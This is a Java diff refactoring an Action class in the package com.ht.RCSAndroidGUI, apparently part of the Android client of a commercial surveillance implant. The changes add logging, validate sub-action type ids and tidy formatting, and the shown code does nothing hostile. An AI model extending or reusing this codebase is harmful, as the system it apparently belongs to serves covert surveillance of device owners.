@@ -12,29 +12,25 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.ListIterator;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.RCSException;
 import com.ht.RCSAndroidGUI.util.Check;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class Action.
  */
 public class Action {
+	private static final String TAG = "Action";
+	
 	/** The Constant ACTION_NULL. */
 	public static final int ACTION_NULL = -1;
 
 	/** Action array. */
-	// private final SubAction[] subArray;
 	private final List<SubAction> list;
 
 	/** Action ID. */
 	private final int actionId;
-
-	/** Number of subactions in this action. */
-	// private final int subActionsNum;
-
-	/** Internal action counter. */
-	// private int subActionIndex;
 
 	/**
 	 * Action constructor.
@@ -47,7 +43,7 @@ public class Action {
 	 *             the RCS exception
 	 */
 	public Action(final int id) {
-		Check.asserts(id>=0, "Invalid id");
+		Check.asserts(id >= 0, "Invalid id");
 
 		this.actionId = id;
 		list = new ArrayList<SubAction>();
@@ -81,13 +77,19 @@ public class Action {
 	 * @throws RCSException
 	 *             the RCS exception
 	 */
-	public void addSubAction(final int type, final byte[] params) throws RCSException {
-		final SubAction sub = SubAction.factory(type, params);
-		list.add(sub);
+	public void addSubAction(final int typeId, final byte[] params) throws RCSException {
+		SubActionType type = SubActionType.get(typeId);
+		if (type != null) {
+			final SubAction sub = SubAction.factory(type, params);
+			list.add(sub);
+		}else{
+			Log.d("QZ", TAG + " Error (addSubAction): unknown type Id = " + typeId);
+		}
 	}
-	
+
 	/**
 	 * Mainly for test purposes
+	 * 
 	 * @param sub
 	 */
 	public void addSubAction(SubAction sub) {
@@ -112,6 +114,6 @@ public class Action {
 	}
 
 	public SubAction[] getSubActions() {
-		return list.toArray(new SubAction[]{});
+		return list.toArray(new SubAction[] {});
 	}
 }
